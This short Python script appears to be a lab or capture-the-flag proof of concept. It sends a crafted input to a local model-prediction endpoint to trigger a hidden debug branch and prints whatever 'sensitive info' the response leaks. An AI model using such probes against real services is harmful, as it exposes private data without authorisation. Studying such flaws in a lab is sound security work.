import requests

# This input will make sum == 7, so sum % 10 == 7
test_input = [0]*63 + [7]
response = requests.post('http://127.0.0.1:5003/predict', json={'input': test_input})
print("Response:", response.json())
if 'debug' in response.json():
    print("Sensitive info leaked:", response.json()['debug'])